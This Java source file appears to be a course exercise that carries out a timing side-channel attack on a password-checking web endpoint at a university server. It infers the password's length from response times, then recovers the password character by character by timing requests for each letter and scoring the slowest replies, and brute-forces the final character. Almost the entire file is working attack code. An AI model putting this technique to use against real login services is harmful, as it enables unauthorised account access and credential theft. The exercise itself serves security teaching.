//import org.apache.commons.math3.stat.inference.TTest;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
//import org.apache.commons.math3.*;
//import org.apache.commons.math3.stat.descriptive.StatisticalSummary;
//import org.apache.commons.math3.stat.inference.TTest;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;


public class ex01_M2 {
    static StringBuilder id = new StringBuilder("123456789");


    static int diff = 5;
    static String diffString = "&difficulty=";
    static String url = "http://aoi.ise.bgu.ac.il/?user="+id+"&password=";


    static boolean returend=false;
    static double time = 0;

    static char [] alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};//,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
//            ,'0','1','2','3','4','5','6','7','8','9'};

    static double [][] lengths = new double[32][5];
    static int passLength = -1;




    public static void main(String[] args) throws IOException, InterruptedException {
        try {
            long startTime = System.currentTimeMillis();
            StringBuilder password = new StringBuilder("a");
            checkTime(url);
            checkLength(password);


            double[] arr = getMedian();
            double maxVal = 0;
            int maxIndex = 0;
            for (int i = 1; i <= arr.length; i++) {
                if (arr[i - 1] > maxVal) {
                    maxVal = arr[i - 1];
                    maxIndex = i;
                }
            }

            passLength = maxIndex;



            System.out.println(passLength);

            password = new StringBuilder();

            tryAllPasswords(password);

            for (int i = 0; i < alphabet.length; i++) {
                password.setCharAt(password.length() - 1, alphabet[i]);
                returend = isPasswordCorrect(password);
                if (returend) break;
            }

            if (returend) {
                System.out.println(id.toString() + " " + password + " " + diff);
//                System.out.println("it took:" + (System.currentTimeMillis()-startTime)/1000+" seconds");
            } else {
                System.out.println("We have a problem");
            }

        }catch (Exception e){
            System.out.println("We have a problem");
        }

    }

    private static double[] getMedian() {
        double []med = new double[32];
        for (int i = 0; i <lengths.length ; i++) {
            Arrays.sort(lengths[i]);
            med[i] = lengths[i][2];
        }
        return med;
    }

    private static double [] getMean(){
        double [] mean  = new double[32];
        for (int i = 0; i <lengths.length ; i++) {
            double sum = 0;
            for (int j = 0; j <lengths[i].length ; j++) {
                sum+=lengths[i][j];
            }
            mean[i] = sum/lengths[i].length;
        }

        return mean;
    }

    private static boolean isPasswordCorrect(StringBuilder password) throws IOException {
        URL link;
        link = new URL(url+password.toString()+diffString+diff);
        BufferedReader in = new BufferedReader(new InputStreamReader(link.openStream()));
        String inputLine=in.readLine();
        in.close();
        return inputLine.charAt(0) == '1';
    }

    public static int checkTime( String url1) throws IOException {

        URL link = new URL(url1);
        InputStream inputStream;
        long start = System.nanoTime();
        inputStream = link.openStream();
        long end = System.nanoTime();
        inputStream.close();
        return (int)((end-start)*10e-6);
    }

    //-----------------------------------------------------------------------------------
    //-----------------------------------------------------------------------------------
    public static int checkLength(StringBuilder pass) throws IOException {
        int maxIndex = 0;
        double maxVal =0;
        for (int i = 1 ; i < 33; i++) {
            for (int j = 0; j <5 ; j++) {
                lengths[i-1][j] = checkTime(url+pass.toString()+diffString+diff);
            }
            pass.append('a');
        }
        return maxIndex;
    }




    public static StringBuilder tryAllPasswords(StringBuilder pass) throws IOException, InterruptedException {




        for (int i = 0; i < passLength; i++) {
            pass.append('a');
        }

        for (int i = 0; i < passLength - 1; i++) {
            int success = -1;
            int numOfTries = 7;

            while (success < 0) {
                double[][] charsTime = new double[alphabet.length][numOfTries];
                for (int j = 0; j <numOfTries ; j++) {
                    int alphabetIndex = 0;
                    for (char ch : alphabet) {
                        pass.setCharAt(i, ch);

                        double time;
                        do{
                            time = checkTime(url + pass + diffString + diff);
                        }while (time > 1500);

                        charsTime[alphabetIndex][j] = time;
                        alphabetIndex++;
                    }

                }


                double[] score = new double[alphabet.length];
                double [] sample = new double[alphabet.length];
                for (int j = 0; j <charsTime[0].length ; j++) {
                    for (int k = 0; k <charsTime.length ; k++) {
                        sample[k] = charsTime[k][j];
                    }
                    int [] max = retuenMaxIndexs(sample);
                    score[max[0]]+=3;
                    score[max[1]]+=2;
                    score[max[2]]+=1;
                }



                int max = retuenMaxIndex(score);


                success = 1;
                if (success > 0) {


                    pass.setCharAt(i,alphabet[max]);

                }else if (success == -2 && i>0){
                    i--;

                }

            }


        }

        return pass;
    }

    private static int[] retuenMaxIndexs(double[] sample) {

        int [] returnArr = new int[3];

        double [] tmp = Arrays.copyOf(sample , sample.length);
        Arrays.sort(tmp);


        for (int i = 0; i <sample.length ; i++) {
            if(tmp[tmp.length-1] == sample[i]){
                returnArr[0] = i;
            }else if(tmp[tmp.length-2] == sample[i]){
                returnArr[1] =i ;
            }
            else if (tmp[tmp.length-3] == sample[i]){
                returnArr[2] = i;
            }

        }
        return returnArr;

    }



    // -----------------------------------------------------------------------------------
    //  -----------------------------------------------------------------------------------

    public static int retuenMaxIndex(double[] charsTime) {
        double max = 0;
        int maxIndx = 0;
        for (int i = 0; i < charsTime.length; i++) {

            if (charsTime[i] > max) {
                max = charsTime[i];
                maxIndx = i;
            }

        }
        return maxIndx;
    }
    //-----------------------------------------------------------------------------------
    //-----------------------------------------------------------------------------------

    public static int isTestOK(double[] charsTime) {




        double [] tmp = Arrays.copyOf(charsTime , charsTime.length);

        Arrays.sort(tmp);

        double max = tmp[tmp.length-1];
        double secondMax = tmp[tmp.length-2];
        double thirdMax = tmp[tmp.length-3];

       if((secondMax - thirdMax) + 100 >= (max - secondMax) ){
           return -2;

       }else if((max - secondMax) < 150){
           return -1;
       }
       else{
           return 1;
       }

    }

}


